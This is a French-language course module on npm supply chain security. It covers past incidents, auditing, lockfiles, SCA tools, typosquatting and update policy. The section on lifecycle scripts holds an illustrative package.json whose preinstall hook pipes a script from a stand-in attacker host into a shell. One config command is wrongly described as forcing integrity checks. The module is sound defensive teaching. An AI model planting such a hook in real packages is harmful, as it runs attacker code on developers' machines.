# Module 09 — Sécurité de la Supply Chain

## Objectifs pédagogiques

- Comprendre les attaques supply chain et leurs impacts
- Auditer les dépendances avec npm/pnpm audit
- Maîtriser le rôle des lockfiles et de l'intégrité des packages
- Utiliser des outils SCA (Software Composition Analysis)
- Se protéger contre le typosquatting et les scripts malveillants
- Mettre en place une politique de mise à jour durable

---

## 1. Qu'est-ce qu'une attaque supply chain

Une attaque supply chain cible la **chaîne d'approvisionnement logicielle** : au lieu d'attaquer directement votre application, l'attaquant compromet une **dépendance** que vous utilisez.

> Avec npm, une application moyenne dépend de **centaines** de packages transitifs. Chaque package est un vecteur d'attaque potentiel.

### Cas réels marquants

#### event-stream (2018)

Un mainteneur fatigué a cédé le contrôle du package `event-stream` (2M+ téléchargements/semaine) à un inconnu. Celui-ci a ajouté une dépendance `flatmap-stream` contenant du code malveillant ciblant les portefeuilles Bitcoin de l'application Copay.

#### ua-parser-js (2021)

Le compte npm du mainteneur a été compromis. Des versions malveillantes (0.7.29, 0.8.0, 1.0.0) ont été publiées, installant un cryptominer et un trojan sur les machines des développeurs.

#### colors.js / faker.js (2022)

Le mainteneur Marak Squires a **intentionnellement** saboté ses propres packages utilisés par des milliers de projets, introduisant des boucles infinies en protestation contre l'utilisation gratuite par les grandes entreprises.

#### node-ipc (2022)

Le mainteneur a ajouté du code qui écrasait les fichiers des utilisateurs avec des IPs géolocalisées en Russie ou Biélorussie, en protestation contre la guerre en Ukraine.

---

## 2. Audit des dépendances

### npm audit / pnpm audit

```bash
# Lancer un audit
npm audit
pnpm audit

# Audit avec niveau minimum
npm audit --audit-level=high

# Corriger automatiquement les vulnérabilités
npm audit fix

# Forcer les mises à jour majeures (⚠️ risque de breaking changes)
npm audit fix --force
```

### Lecture d'un rapport CVE

```
┌───────────────┬──────────────────────────────────────────────────┐
│ High          │ Prototype Pollution in lodash                    │
├───────────────┼──────────────────────────────────────────────────┤
│ Package       │ lodash                                           │
│ Patched in    │ >=4.17.21                                        │
│ Dependency of │ my-project                                       │
│ Path          │ my-project > some-lib > lodash                   │
│ More info     │ https://github.com/advisories/GHSA-xxxx-xxxx    │
└───────────────┴──────────────────────────────────────────────────┘
```

### Niveaux de sévérité

| Niveau | CVSS Score | Action recommandée |
|---|---|---|
| **Critical** | 9.0 – 10.0 | Corriger immédiatement |
| **High** | 7.0 – 8.9 | Corriger dans les 24-48h |
| **Medium** | 4.0 – 6.9 | Corriger dans la semaine |
| **Low** | 0.1 – 3.9 | Planifier pour le prochain sprint |

---

## 3. Lockfiles et intégrité

### Rôle du lockfile

Le lockfile garantit que **tous les membres de l'équipe** et la **CI** installent exactement les mêmes versions :

```yaml
# Extrait de pnpm-lock.yaml
packages:
  express@4.18.2:
    resolution: {integrity: sha512-...}
    dependencies:
      accepts: 1.3.8
      body-parser: 1.20.1
      # ...
```

Sans lockfile, `npm install` pourrait installer une version **différente** d'une dépendance transitive à chaque exécution.

### npm ci vs npm install

| Commande | Comportement |
|---|---|
| `npm install` | Résout et installe, peut modifier le lockfile |
| `npm ci` | Installe exactement ce qui est dans le lockfile, erreur si incohérence |

```bash
# En CI/CD, TOUJOURS utiliser npm ci (ou pnpm install --frozen-lockfile)
npm ci

# Avec pnpm
pnpm install --frozen-lockfile
```

> **Règle** : `npm install` en développement, `npm ci` en CI/CD.

### Integrity hashes

Chaque package dans le lockfile a un hash SHA-512 qui garantit que le contenu n'a pas été modifié :

```
integrity: sha512-abc123...==
```

Si le contenu du package change entre le moment de la publication et l'installation, le hash ne correspondra pas et l'installation échouera.

```bash
# Forcer la vérification d'intégrité
npm config set audit-level high
```

---

## 4. Software Composition Analysis (SCA)

Les outils SCA vont au-delà de `npm audit` en analysant les vulnérabilités connues, les licences, et le comportement des packages.

### Snyk

```bash
# Installation
npm install -g snyk

# Authentification
snyk auth

# Scanner le projet
snyk test

# Surveiller en continu
snyk monitor
```

```typescript
// Intégration dans le pipeline CI (GitHub Actions)
// .github/workflows/security.yml
/*
name: Security Scan
on: [push, pull_request]
jobs:
  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
*/
```

### Dependabot (GitHub)

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
```

### Socket.dev

Socket.dev analyse le **comportement** des packages (accès réseau, accès filesystem, exécution de code dynamique) plutôt que seulement les CVE connus :

```
⚠️ socket: express-session@1.17.3
   - Uses network communication
   - Uses filesystem access
   - Uses environment variables

🚨 socket: suspicious-package@1.0.0
   - Installs scripts (postinstall)
   - Uses eval()
   - Obfuscated code detected
```

---

## 5. Typosquatting et packages malveillants

### Qu'est-ce que le typosquatting ?

L'attaquant publie un package avec un nom **similaire** à un package populaire :

```
lodash      → lodahs, lodashs, 1odash
express     → expres, expreess, xpress
react       → recat, recact
typescript  → typescipt, tyepscript
```

### Comment détecter

```typescript
// Avant d'installer un package, vérifier :
// 1. Le nombre de téléchargements hebdomadaires
// 2. Le publisher (compte vérifié ?)
// 3. L'âge du package
// 4. Le lien vers le dépôt source
// 5. Le nombre de dépendances

// Script de vérification basique
async function checkPackage(name: string): Promise<void> {
  const response = await fetch(`https://registry.npmjs.org/${name}`);
  const data = await response.json();

  console.log(`Package: ${name}`);
  console.log(`Latest: ${data['dist-tags']?.latest}`);
  console.log(`Repository: ${data.repository?.url}`);
  console.log(`Maintainers: ${data.maintainers?.map((m: { name: string }) => m.name).join(', ')}`);

  const lastPublish = new Date(data.time?.[data['dist-tags']?.latest]);
  console.log(`Last published: ${lastPublish.toISOString()}`);
}
```

### Vérification du publisher

Sur npmjs.com, vérifiez :
- ✅ Compte avec 2FA activé
- ✅ Organisation vérifiée
- ✅ Historique de publications cohérent
- ✅ Lien vers un dépôt GitHub actif
- ❌ Compte récent avec un seul package
- ❌ Pas de dépôt source

---

## 6. Scripts NPM malveillants

### Le danger des lifecycle scripts

Les scripts `preinstall` et `postinstall` s'exécutent **automatiquement** lors de `npm install` :

```json
{
  "name": "malicious-package",
  "scripts": {
    "preinstall": "curl https://evil.com/steal.sh | sh",
    "postinstall": "node -e \"require('child_process').exec('...')\""
  }
}
```

### Protection

```bash
# Installer sans exécuter les scripts
npm install --ignore-scripts

# Configurer globalement
npm config set ignore-scripts true

# Puis exécuter manuellement les scripts de confiance
npm rebuild
```

### Vérifier les scripts avant installation

```bash
# Voir les scripts d'un package AVANT de l'installer
npm pack <package-name> --dry-run
npm info <package-name> scripts
```

```bash
# Lister tous les packages avec des scripts d'installation
npm query ':attr(scripts, [postinstall])' | jq '.[].name'
npm query ':attr(scripts, [preinstall])' | jq '.[].name'
```

---

## 7. Politique de mise à jour

### Renovate Bot

Renovate est plus configurable que Dependabot :

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "schedule": ["every weekend"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "branch"
    },
    {
      "matchUpdateTypes": ["minor"],
      "automerge": true,
      "requiredStatusChecks": ["ci/tests"]
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["breaking-change"]
    },
    {
      "matchPackageNames": ["typescript", "eslint"],
      "groupName": "dev tooling"
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"]
  }
}
```

### Semver et breaking changes

```
Version: MAJOR.MINOR.PATCH
         ^     ^     ^
         |     |     └── Bug fixes, pas de changement d'API
         |     └──────── Nouvelles fonctionnalités, rétrocompatible
         └────────────── Breaking changes
```

| Range | Signification |
|---|---|
| `^1.2.3` | `>=1.2.3 <2.0.0` (minor + patch) |
| `~1.2.3` | `>=1.2.3 <1.3.0` (patch seulement) |
| `1.2.3` | Exactement cette version |

> **Recommandation** : utilisez `^` par défaut mais verrouillez les dépendances critiques (base de données, frameworks).

### Automated testing des updates

```yaml
# Dans la CI, tester automatiquement les mises à jour Renovate
name: Test Dependency Update
on:
  pull_request:
    labels: [dependencies]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm test
      - run: npm run build
      - run: npm run e2e
```

---

## 8. Bonnes pratiques

### Principe de moindre dépendance

Avant d'ajouter une dépendance, posez-vous la question :

1. **Est-ce que j'en ai vraiment besoin ?** (ex: `is-odd` → `n % 2 !== 0`)
2. **Puis-je implémenter cette fonctionnalité moi-même en peu de lignes ?**
3. **Le package est-il activement maintenu ?**
4. **Combien de dépendances transitives ajoute-t-il ?**

```bash
# Voir l'arbre complet des dépendances
npm ls --all

# Compter le nombre total de dépendances transitives
npm ls --all --parseable | wc -l
```

### npm provenance / Package signing

npm provenance lie un package publié à son **code source** et à son **pipeline CI** :

```bash
# Publier avec provenance (depuis GitHub Actions)
npm publish --provenance
```

Sur npmjs.com, les packages avec provenance affichent un badge vert indiquant que le build est traçable.

### Registry privé

Pour les projets d'entreprise, utilisez un registry privé :

```bash
# Verdaccio — registry privé léger
npx verdaccio

# Configuration .npmrc
registry=https://registry.company.com/
@company:registry=https://registry.company.com/
```

GitHub Packages et GitLab Package Registry sont des alternatives hébergées.

---

## 9. Résumé

| Menace | Protection |
|---|---|
| CVE dans les dépendances | `npm audit`, Snyk, Dependabot |
| Versions incohérentes | Lockfiles + `npm ci` |
| Typosquatting | Vérification du publisher, Socket.dev |
| Scripts malveillants | `--ignore-scripts`, audit des scripts |
| Supply chain compromise | Provenance, intégrité SHA-512 |
| Dépendances obsolètes | Renovate Bot, mises à jour automatisées |

---

## Exercice pratique

1. Lancez `npm audit` sur un projet existant et analysez le rapport
2. Configurez Dependabot ou Renovate sur un dépôt GitHub
3. Vérifiez qu'un package suspect n'est pas du typosquatting avec `npm info`
4. Listez tous les packages ayant des scripts `postinstall` dans vos dépendances
5. Ajoutez `--frozen-lockfile` à votre pipeline CI

---

## Ressources

- [npm audit documentation](https://docs.npmjs.com/cli/v10/commands/npm-audit)
- [Snyk](https://snyk.io/)
- [Socket.dev](https://socket.dev/)
- [Renovate Bot](https://docs.renovatebot.com/)
- [npm Provenance](https://docs.npmjs.com/generating-provenance-statements)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
